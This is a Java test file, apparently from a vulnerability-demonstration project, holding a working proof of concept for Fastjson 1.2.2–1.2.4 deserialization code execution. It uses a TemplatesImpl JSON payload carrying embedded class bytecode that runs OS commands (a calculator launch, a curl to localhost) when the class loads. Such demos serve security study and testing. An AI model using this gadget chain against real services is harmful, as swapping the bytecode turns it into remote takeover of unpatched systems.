package org.javaweb.vuln;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.junit.jupiter.api.Test;

import java.util.LinkedHashMap;
import java.util.Map;

import static org.apache.commons.codec.binary.Base64.encodeBase64String;

public class TestAbstractTransletTest {

	public static final byte[] CLASS_BYTES = new byte[]{
			-54, -2, -70, -66, 0, 0, 0, 50, 0, 94, 10, 0, 21, 0, 55, 10, 0, 56, 0, 57, 9, 0, 17, 0, 58, 10, 0, 56, 0, 59, 7, 0, 60, 7, 0, 61, 10, 0, 6, 0, 62, 8, 0, 63, 8, 0, 64, 10, 0, 65, 0, 66, 8, 0, 67, 10, 0, 68, 0, 69, 8, 0, 70, 8, 0, 71, 8, 0, 72, 7, 0, 73, 7, 0, 74, 10, 0, 17, 0, 55, 10, 0, 16, 0, 75, 10, 0, 16, 0, 76, 7, 0, 77, 7, 0, 78, 1, 0, 7, 99, 111, 109, 109, 97, 110, 100, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 39, 76, 111, 114, 103, 47, 106, 97, 118, 97, 119, 101, 98, 47, 118, 117, 108, 110, 47, 84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 59, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 79, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 2, 105, 116, 1, 0, 53, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 3, 114, 117, 110, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 60, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 6, 111, 115, 78, 97, 109, 101, 7, 0, 80, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 25, 84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 46, 106, 97, 118, 97, 12, 0, 25, 0, 26, 7, 0, 81, 12, 0, 82, 0, 83, 12, 0, 23, 0, 24, 12, 0, 84, 0, 85, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 25, 0, 86, 1, 0, 22, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 87, 12, 0, 88, 0, 89, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 80, 12, 0, 90, 0, 91, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57, 57, 57, 57, 47, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 101, 97, 100, 1, 0, 37, 111, 114, 103, 47, 106, 97, 118, 97, 119, 101, 98, 47, 118, 117, 108, 110, 47, 84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 12, 0, 25, 0, 92, 12, 0, 93, 0, 26, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 18, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 110, 97, 98, 108, 101, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 23, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 110, 97, 98, 108, 101, 59, 41, 86, 1, 0, 5, 115, 116, 97, 114, 116, 0, 33, 0, 17, 0, 21, 0, 1, 0, 22, 0, 1, 0, 10, 0, 23, 0, 24, 0, 0, 0, 5, 0, 1, 0, 25, 0, 26, 0, 1, 0, 27, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 28, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 29, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 30, 0, 31, 0, 0, 0, 1, 0, 32, 0, 33, 0, 2, 0, 27, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 28, 0, 0, 0, 6, 0, 1, 0, 0, 0, 28, 0, 29, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 30, 0, 31, 0, 0, 0, 0, 0, 1, 0, 34, 0, 35, 0, 1, 0, 0, 0, 1, 0, 36, 0, 37, 0, 2, 0, 38, 0, 0, 0, 4, 0, 1, 0, 39, 0, 1, 0, 32, 0, 40, 0, 2, 0, 27, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 28, 0, 0, 0, 6, 0, 1, 0, 0, 0, 33, 0, 29, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 30, 0, 31, 0, 0, 0, 0, 0, 1, 0, 34, 0, 35, 0, 1, 0, 0, 0, 1, 0, 41, 0, 42, 0, 2, 0, 0, 0, 1, 0, 43, 0, 44, 0, 3, 0, 38, 0, 0, 0, 4, 0, 1, 0, 39, 0, 1, 0, 45, 0, 26, 0, 1, 0, 27, 0, 0, 0, 113, 0, 3, 0, 2, 0, 0, 0, 24, -72, 0, 2, -78, 0, 3, -74, 0, 4, 87, -89, 0, 13, 76, -69, 0, 6, 89, 43, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 10, 0, 13, 0, 5, 0, 3, 0, 28, 0, 0, 0, 22, 0, 5, 0, 0, 0, 38, 0, 10, 0, 41, 0, 13, 0, 39, 0, 14, 0, 40, 0, 23, 0, 42, 0, 29, 0, 0, 0, 22, 0, 2, 0, 14, 0, 9, 0, 46, 0, 47, 0, 1, 0, 0, 0, 24, 0, 30, 0, 31, 0, 0, 0, 48, 0, 0, 0, 7, 0, 2, 77, 7, 0, 49, 9, 0, 8, 0, 50, 0, 26, 0, 1, 0, 27, 0, 0, 0, -111, 0, 4, 0, 1, 0, 0, 0, 60, 18, 8, -77, 0, 3, 18, 9, -72, 0, 10, 75, 42, 18, 11, -74, 0, 12, -103, 0, 11, 18, 13, -77, 0, 3, -89, 0, 17, 42, 18, 14, -74, 0, 12, -103, 0, 8, 18, 15, -77, 0, 3, -69, 0, 16, 89, -69, 0, 17, 89, -73, 0, 18, -73, 0, 19, -74, 0, 20, -79, 0, 0, 0, 3, 0, 28, 0, 0, 0, 34, 0, 8, 0, 0, 0, 11, 0, 5, 0, 14, 0, 11, 0, 16, 0, 20, 0, 17, 0, 28, 0, 18, 0, 37, 0, 19, 0, 42, 0, 22, 0, 59, 0, 23, 0, 29, 0, 0, 0, 12, 0, 1, 0, 11, 0, 48, 0, 51, 0, 24, 0, 0, 0, 48, 0, 0, 0, 9, 0, 2, -4, 0, 28, 7, 0, 52, 13, 0, 1, 0, 53, 0, 0, 0, 2, 0, 54
	};

	/**
	 * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
	 */
	@Test
	public void fastjsonRCE() {
		// 构建恶意的JSON
		Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
		dataMap.put("@type", TemplatesImpl.class.getName());
		dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
		dataMap.put("_name", "");
		dataMap.put("_tfactory", new Object());
		dataMap.put("_outputProperties", new Object());

		// 生成Payload
		String json = JSON.toJSONString(dataMap);
		System.out.println(json);

		// 使用FastJson反序列化，但必须启用SupportNonPublicField特性
		JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
	}

}
